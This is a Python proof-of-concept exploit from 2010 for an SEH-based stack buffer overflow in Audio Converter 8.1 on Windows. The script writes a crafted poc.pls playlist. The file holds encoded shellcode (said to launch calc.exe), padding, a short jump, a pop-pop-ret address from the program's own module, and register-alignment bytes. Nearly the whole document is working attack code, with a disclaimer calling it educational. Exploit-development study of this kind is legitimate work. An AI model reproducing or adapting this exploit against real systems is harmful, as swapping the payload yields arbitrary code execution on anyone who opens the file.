#***********************************************************************************
# Exploit Title : Audio Converter 8.1 0day Stack Buffer Overflow PoC exploit
# Date          : 16/05/2010
# Author        : Sud0
# Bug found by  : chap0
# Software Link : http://download.cnet.com/Audio-Converter/3000-2140_4-10045287.html
# Version       : 8.1
# OS            : Windows
# Tested on     : XP SP3 En (VirtualBox)
# Type of vuln  : SEH
# Thanks to my wife for her support
# Thanks for chap0 for bringing us the game
# Greetz to: Corelan Security Team
# http://www.corelan.be:8800/index.php/security/corelan-team-members/
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
# Corelan does not want anyone to use this script
# for malicious and/or illegal purposes
# Corelan cannot be held responsible for any illegal use.
#
# Note : you are not allowed to edit/modify this code. 
# If you do, Corelan cannot be held responsible for any damages this may cause.
#***********************************************************************************
#code :
print "|------------------------------------------------------------------|\n";
print "|                         __               __                      |\n";
print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n";
print "|  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |\n";
print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n";
print "| \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |\n";
print "|                                                                  |\n";
print "|                                       http://www.corelan.be:8800 |\n";
print "|                                                                  |\n";
print "|-------------------------------------------------[ EIP Hunters ]--|\n\n";
print "[+] Exploit for .... \n";

import socket
#shellcode running calc.exe alpha2 encoded basereg edx
shell="JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIlKXlpUnkxlqx7P7PQ0fOrHpcparLQsLMaUzXPPNXKwOcxBCGKOZpA"  
junk="B" * (4432 - len(shell))  #seh overwritten after 4432 bytes
nseh= "\xEB\x06\xEB\x06" # jmp forward 
seh= "\xF1\x8E\x03\x10" # nice ppr from audioconv
align="\x61\x61\x61\xff\xE2" # popad / popad / popad / jmp edx
buffer= shell + junk + nseh + seh + "\x90" * 20 + align  + "A"* 10000#  added some nops after seh
 
mefile = open('poc.pls','w');
mefile.write(buffer);
mefile.close()
